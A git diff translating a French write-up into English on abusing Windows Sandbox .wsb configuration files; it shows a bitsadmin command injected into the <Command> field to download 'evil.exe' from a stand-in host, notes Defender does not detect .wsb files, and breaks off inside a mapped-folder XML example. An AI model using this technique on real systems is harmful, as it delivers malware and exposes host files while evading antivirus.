@@ -1,31 +1,31 @@
 
-I  - Fonctionnement du Windows Sandbox
+I - How Windows Sandbox works
 
 
-Windows Sandbox (WSB) va permettre de créer un environnement de bureau isolé, 
-Les fichiers de configuration de WSB sont au format XML et utilisent l’extension .wsb.
+Windows Sandbox (WSB) will allow to create an isolated desktop environment, 
+WSB configuration files are in XML format and use the .wsb extension.
 
 
 ![image](https://user-images.githubusercontent.com/75935486/152426360-480974ca-877d-4786-a715-237211be7558.png)
 
 
 
-voici l'exemple d'un fichier de configuration: 
+Here is an example of a configuration file: 
 
 
 
 
-### Exploiter les configurations WSB:
+### Exploiting WSB configurations:
 
 
-Une des première méthodes consiste à modifier le champs `<Command>` pour executer notre commande malicieuse et accéder au fichiers systèmes de l'hote, en plus de ça les fichiers WSB ne se font pas détecter par Windows Defender.
+One of the first methods is to modify the `<Command>` field to execute our malicious command and access the host's system files, in addition to that WSB files are not detected by Windows Defender.
 
-Commande possible d'injecter:
+Possible command to inject:
 ```powershell
 <Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
 ```
 
-Compromissions de la configuration:
+Configuration compromises:
 ```xml
 <Configuration>
    <MappedFolders>
